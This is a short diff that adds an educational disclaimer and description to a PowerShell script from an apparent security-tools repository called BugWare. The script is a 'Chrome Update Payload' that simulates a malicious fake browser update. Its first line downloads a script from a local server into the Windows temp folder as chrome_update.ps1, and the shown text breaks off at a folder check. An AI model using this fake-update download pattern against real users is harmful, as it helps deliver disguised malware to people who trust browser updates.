@@ -1,3 +1,19 @@
+# -------------------------------------------------------------------------
+# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
+# This script is part of the BugWare repository, a collection of security tools
+# and PoCs for learning about attack vectors.
+# DO NOT USE THIS FOR ILLEGAL PURPOSES.
+# -------------------------------------------------------------------------
+
+<#
+.SYNOPSIS
+    Chrome Update Payload
+.DESCRIPTION
+    Simulates a malicious update process claiming to be a Chrome browser update.
+.AUTHOR
+    CyberPanther232
+#>
+
 Invoke-WebRequest -Uri "http://localhost:8080/api/inject?status=Laying-eggs" -OutFile "C:\Windows\Temp\chrome_update.ps1"
 
 if (!(Test-Path -Path "C:\Users\Public\chrome_browser")) {
